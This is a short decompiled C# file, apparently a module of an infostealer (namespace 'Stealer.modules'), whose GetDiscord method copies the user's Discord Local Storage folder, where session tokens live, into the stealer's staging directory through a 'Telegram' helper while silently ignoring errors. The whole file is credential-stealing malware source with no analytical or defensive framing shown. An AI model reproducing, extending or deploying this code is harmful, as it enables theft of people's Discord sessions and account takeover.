using System;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x0200001F RID: 31
	internal class Discord
	{
		// Token: 0x060000A6 RID: 166 RVA: 0x000088E4 File Offset: 0x00006AE4
		public static void GetDiscord()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage";
			string text2 = Program.path + "\\Discord";
			try
			{
				if (Directory.Exists(text))
				{
					if (!Directory.Exists(text2))
					{
						Directory.CreateDirectory(text2);
					}
					Telegram.CopyAll(text, text2);
				}
			}
			catch
			{
			}
		}
	}
}
